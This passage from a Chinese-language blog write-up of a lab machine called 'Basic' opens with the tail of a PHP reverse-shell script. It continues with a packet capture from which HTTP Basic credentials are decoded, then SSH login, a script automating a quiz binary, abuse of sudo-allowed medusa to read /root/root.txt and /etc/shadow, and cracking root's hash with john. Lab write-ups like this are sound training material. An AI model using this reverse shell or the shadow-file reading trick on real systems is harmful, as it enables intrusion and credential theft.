+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?&gt;
+
+09:50:24.003100 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [F.], seq 2799, ack 153, win 508, options [nop,nop,TS val 1602276766 ecr 2885018458], length 0
+E..4.=@.@.|..........P......+G.............
+_......Z
+09:50:24.003289 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [.], ack 2799, win 496, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
+E..4..@.@.G9...........P+G.................
+...Z_...
+09:50:24.003466 IP 192.168.205.167.40214 &gt; 192.168.205.128.http: Flags [F.], seq 153, ack 2800, win 501, options [nop,nop,TS val 2885018458 ecr 1602276766], length 0
+E..4..@.@.G8...........P+G.................
+...Z_...
+09:50:24.003474 IP 192.168.205.128.http &gt; 192.168.205.167.40214: Flags [.], ack 154, win 508, options [nop,nop,TS val 1602276767 ecr 2885018458], length 0
+E..4.&gt;@.@.|..........P......+G.............
+_......Z
+09:50:24.003898 IP 192.168.205.167.http &gt; 192.168.205.1.60742: Flags [P.], seq 1:2113, ack 573, win 501, length 2112: HTTP: HTTP/1.1 200 OK
+E....R@.@............P.F..p...&amp;.P.......HTTP/1.1 200 OK
+Date: Mon, 07 Jul 2025 13:50:24 GMT
+Server: Apache/2.4.62 (Debian)
+Vary: Accept-Encoding
+Content-Encoding: gzip
+Content-Length: 1859
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+...........X}o.6...|.....R!@..G.[....M...6M..L........n....v.!.J7R)........W..n.~...H'.UcT.(    .....f:.W....aB?gTi*G.[u.J?...7.....z5.Pp.      I...!\KF..P.........    Yv.,....z.tY..s.....i.... `|&gt;........Rd&lt;..".r...ss......&gt;.K.....6."b........I..)To{..Q.   ..(8H..G....i.N.....D...Q.-OOOke.       .E2.L..Y..)..dE..Ph.&lt;.2../.dl..M...4&amp;..aL+...t7...L...R:nj.....Q.xx|.;.;..;k..A..eg...2.........&lt;..~.^1..H+......Km13..h*..t...0._.H..g..w..6.$UY.1...1..".......I....5BLCmMP....:A9..G..-......X1|..P.09...
+...^.u.4...B....5.S[6*....A.\u0..[.^v"...6....a...,..............6C;*%&gt;...;.I...#/..#....i.y#....c....jA.uc.E....L!......1B.KT..'TG".7..&gt;=. ,.-.P*.....3.7.c....Q.q..T..e.3(M.F3.......6A..L.....C...Y.t..=.~.7...z.9.....z...(.d]I..E.W7....(...!..t...&lt;....A...Ew.;.......[.v.(]..L..,..R.......a.\....w(@...o.\&amp;..h.C....v.&gt;....1MP[.......}....E...,Mi.Z..Y.L........5.BKH......,.1.w...'.R|..J...O..D^B......u....4....6.........[.S.h(...%t.......9...N&gt;.x.....s&amp;.e..s...R...w....S..$.......o~....b.S\...0.....iJp.gq..TJ!.......d
+t.%,........fDE.a+......2,.:.....Bh......t..V-w*...........
+yt.b1..z..V9j....7.N.....{9.-g....n2.......m....r.-3L.}-#:,....@o...XfMYjC.
+..St.bA..G.c..9.3;dA.W..Q.+.X.nQ...z....?..=a..tw.a..&lt;DL..a..b.1m.      ....%.&amp;qw..y.Q.d...6......D..w....;BrN..1D...........y.6.......c^.`{C&lt;c.W.`{[....b..,.2.....|.s-.J....).S........e....,...$.&amp;...X7+.m....!.........8...i .eA(Eb...b..2..{.s.I..5L./b...4..L.w.S)|...5|.:/..G.m..x.AU;..WLM...L..U..k....8+,8X6.&gt;.(.$1i6...,..[.....N.D.....$.}$&amp;&lt;.vcS.O.o...B&gt;...&amp;`...^b:b..m...    '..B..
+[......."...:.p..       .D..TDf..c^B...%../B.Y.c...E....T2.....1.....&gt;....b...+...T+...yGr..........Z.O7....~.........n~...........t.....QZ...Cp(%...P.TG..yg.F.l..........)....E..Rn.g...L.......T.D~.:.P..B...X....Z.o/.....X.."Fq1.....f^..UUx.O.....|N.'/.@'.w.E.....k....=~.V.w........~.4.&gt;...#;.....#.6..)...g...Q.+^7N...H....d...[..o._$..C....
+09:50:24.004210 IP 192.168.205.1.60742 &gt; 192.168.205.167.http: Flags [.], ack 2113, win 513, length 0
+E..(..@..............F.P..&amp;...x.P...|.........
+^C
+30 packets captured
+30 packets received by filter
+0 packets dropped by kernel
+                     
+</code></pre>
+<p>Authorization: Basic Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==</p>
+<p>base64解一下</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ echo 'Y25oeWs6YmNmODI5NjI3ZWVhMzY0YTNhYmM0MWE2NTM3ZmJmNTQzZTk3NGZmOA==' |base64 -d
+cnhyk:bcf829627eea364a3abc41a6537fbf543e974ff8                                  
+</code></pre>
+<p>登录</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh cnhyk@192.168.205.167           
+The authenticity of host '192.168.205.167 (192.168.205.167)' can't be established.
+ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:4: [hashed name]
+    ~/.ssh/known_hosts:6: [hashed name]
+    ~/.ssh/known_hosts:7: [hashed name]
+    ~/.ssh/known_hosts:12: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.205.167' (ED25519) to the list of known hosts.
+cnhyk@192.168.205.167's password: 
+Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+cnhyk@Basic:~$ id
+uid=1000(cnhyk) gid=1000(cnhyk) groups=1000(cnhyk)
+cnhyk@Basic:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for cnhyk: 
+Sorry, user cnhyk may not run sudo on Basic.
+</code></pre>
+<p>找提权点</p>
+<pre class="notranslate"><code class="notranslate">cnhyk@Basic:~$ cat user.txt 
+flag{user-df31759540dc28f75a20f443a19b1148}
+cnhyk@Basic:~$ find / -perm -4000 -type f 2&gt;/dev/null
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/libexec/polkit-agent-helper-1
+cnhyk@Basic:~$ ss -tulnp
+Netid               State                Recv-Q               Send-Q                             Local Address:Port                               Peer Address:Port               
+udp                 UNCONN               0                    0                                        0.0.0.0:68                                      0.0.0.0:*                  
+tcp                 LISTEN               0                    128                                      0.0.0.0:22                                      0.0.0.0:*                  
+tcp                 LISTEN               0                    128                                         [::]:22                                         [::]:*                  
+tcp                 LISTEN               0                    128                                            *:80                                            *:*                  
+cnhyk@Basic:~$ cd /opt/
+cnhyk@Basic:/opt$ ls -al
+total 28
+drwxr-xr-x  2 root root  4096 Jul  6 09:21 .
+drwxr-xr-x 18 root root  4096 Mar 18 20:37 ..
+-rwx--x--x  1 root root 17016 Jul  6 09:21 jojo
+cnhyk@Basic:/opt$ ./jojo 
+问题 1: 请输入 80+87
+80+87
+正确！
+问题 2: 请输入 57+91
+^C
+</code></pre>
+<p>我愿称之为伪人测试，哈哈哈（纯开玩笑，没有冒犯的意思）</p>
+<pre class="notranslate"><code class="notranslate">cnhyk@Basic:/tmp$ cat a.py 
+cat a.py 
+#!/usr/bin/env python3
+import subprocess
+import sys
+
+JOJO_EXECUTABLE = "/opt/jojo"
+
+def slv():
+    print(f"[+] 正在启动目标程序: {JOJO_EXECUTABLE}")
+
+    try:
+        cmd = ['stdbuf', '-oL', JOJO_EXECUTABLE]
+        p = subprocess.Popen(
+            cmd,
+            stdin=subprocess.PIPE,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
+        )
+    except FileNotFoundError:
+        print(f"[!] 错误：找不到程序 '{JOJO_EXECUTABLE}' 或 'stdbuf'。请检查。")
+        sys.exit(1)
+
+    print("[+] 连接成功！开始自动化交互...\n")
+
+    while True:
+        l = p.stdout.readline()
+        if not l:
+            break
+        print(l.strip())
+
+        if "请输入" in l:
+            try:
+                q = l.split("请输入 ")[1].strip()
+                ans = q
+                print(f"[*] 检测到问题，提取内容: {ans}")
+                print(f"[*] 自动输入: {ans}")
+                p.stdin.write(ans + '\n')
+                p.stdin.flush()
+                print("-" * 20)
+            except IndexError:
+                print("[!] 警告：无法从行中解析问题。")
+
+    p.wait()
+    print(f"\n[+] 交互结束。程序退出，返回码: {p.returncode}")
+
+if __name__ == "__main__":
+    slv()
+</code></pre>
+<p>执行</p>
+<pre class="notranslate"><code class="notranslate">cnhyk@Basic:/tmp$ python3 $_
+python3 $_
+[+] 正在启动目标程序: /opt/jojo
+[+] 连接成功！开始自动化交互...
+
+问题 1: 请输入 61+34
+[*] 检测到问题，提取内容: 61+34
+[*] 自动输入: 61+34
+--------------------
+省略
+--------------------
+正确！
+问题 500: 请输入 95+68
+[*] 检测到问题，提取内容: 95+68
+[*] 自动输入: 95+68
+--------------------
+正确！
+jojo:jojo
+
+[+] 交互结束。程序退出，返回码: 0
+</code></pre>
+<p>jojo:jojo，啊这所以我一开始测试弱密码就不用写代码了......</p>
+<pre class="notranslate"><code class="notranslate">jojo@Basic:/tmp$ id
+uid=1001(jojo) gid=1001(jojo) groups=1001(jojo)
+jojo@Basic:/tmp$ sudo -l
+Matching Defaults entries for jojo on Basic:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jojo may run the following commands on Basic:
+    (ALL) NOPASSWD: /usr/bin/medusa
+</code></pre>
+<p>显而易见了，这是一个密码爆破工具，所以它读取字典大概是有问题的</p>
+<pre class="notranslate"><code class="notranslate">jojo@Basic:/tmp$ sudo /usr/bin/medusa --help
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+
+/usr/bin/medusa: invalid option -- '-'
+CRITICAL: Unknown error processing command-line options.
+ALERT: User logon information must be supplied.
+
+Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+  -h [TEXT]    : Target hostname or IP address
+  -H [FILE]    : File containing target hostnames or IP addresses
+  -u [TEXT]    : Username to test
+  -U [FILE]    : File containing usernames to test
+  -p [TEXT]    : Password to test
+  -P [FILE]    : File containing passwords to test
+  -C [FILE]    : File containing combo entries. See README for more information.
+  -O [FILE]    : File to append log information to
+  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
+  -M [TEXT]    : Name of the module to execute (without the .mod extension)
+  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
+                 different parameter each time and they will all be sent to the module (i.e.
+                 -m Param1 -m Param2, etc.)
+  -d           : Dump all known modules
+  -n [NUM]     : Use for non-default TCP port number
+  -s           : Enable SSL
+  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
+  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
+  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
+  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
+  -t [NUM]     : Total number of logins to be tested concurrently
+  -T [NUM]     : Total number of hosts to be tested concurrently
+  -L           : Parallelize logins using one username per thread. The default is to process 
+                 the entire username before proceeding.
+  -f           : Stop scanning host after first valid username/password found.
+  -F           : Stop audit after first valid username/password found on any host.
+  -b           : Suppress startup banner
+  -q           : Display module's usage information
+  -v [NUM]     : Verbose level [0 - 6 (more)]
+  -w [NUM]     : Error debug level [0 - 10 (more)]
+  -V           : Display version
+  -Z [TEXT]    : Resume scan based on map of previous scan
+</code></pre>
+<p>利用</p>
+<pre class="notranslate"><code class="notranslate">jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /root/root.txt -v 64
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1 
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 1
+ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: flag{root-c065860911bb44a2483c096cbd203df9} (1 of 1 complete)
+GENERAL: Medusa has finished.
+jojo@Basic:/tmp$ sudo /usr/bin/medusa -u root -h 127.0.0.1 -M ssh -P /etc/shadow -v 64
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 1
+GENERAL: Total Hosts: 1 
+GENERAL: Total Users: 1
+GENERAL: Total Passwords: 27
+ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root:$6$sshVeDa7z638dY8S$ZrwHy6TQ8VMkgSx1mGhCPG8Lffedn9LbDPcgCoQdF877zeXPR.NGhm20RlipL5s0HfPQByfwXyVXnM1giQ9tX0:20275:0:99999:7::: (1 of 27 complete)
+^CALERT: Medusa received SIGINT - Sending notification to login threads that we are are aborting.
+ACCOUNT CHECK: [ssh] Host: 127.0.0.1 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: daemon:*:20166:0:99999:7::: (2 of 27 complete)
+ALERT: To resume scan, add the following to your original command: "-Z h1u1."
+</code></pre>
+<p>爆破hash</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                                                                         
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+budayday         (root)     
+1g 0:00:00:36 DONE (2025-07-07 11:16) 0.02707g/s 27110p/s 27110c/s 27110C/s buldogs..brittany_
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre>
+<p>所以说</p>
+<pre class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ grep -w -n 'budayday' /usr/share/wordlists/rockyou.txt                                                                                                
+999993:budayday
+                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ echo 'budayday' &gt; pass                                                                                                        
+                                                                                                                                                                                  
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ssh root@192.168.205.167                                       
+root@192.168.205.167's password: 
+Linux Basic 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Jul  6 08:23:47 2025 from 192.168.3.94
+root@Basic:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>你硬跑应该跑的出来，我浅跑了500行没有限制</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
